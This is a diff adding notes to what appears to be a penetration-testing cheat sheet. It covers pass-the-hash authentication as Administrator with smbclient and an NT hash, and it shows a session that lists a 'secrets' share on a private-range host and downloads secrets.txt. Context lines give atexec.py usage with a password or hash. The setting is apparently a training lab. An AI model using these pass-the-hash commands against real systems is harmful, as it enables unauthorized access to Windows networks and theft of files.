@@ -82,4 +82,18 @@ atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
 atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
 
 
+PtH with smbclient:
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jun  2 16:55:37 2022
+  ..                                DHS        0  Thu Jun  2 16:55:35 2022
+  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022
+                4554239 blocks of size 4096. 771633 blocks available
+smb: \> get secrets.txt
+getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+Using smbclient with NTLM hash
+
 
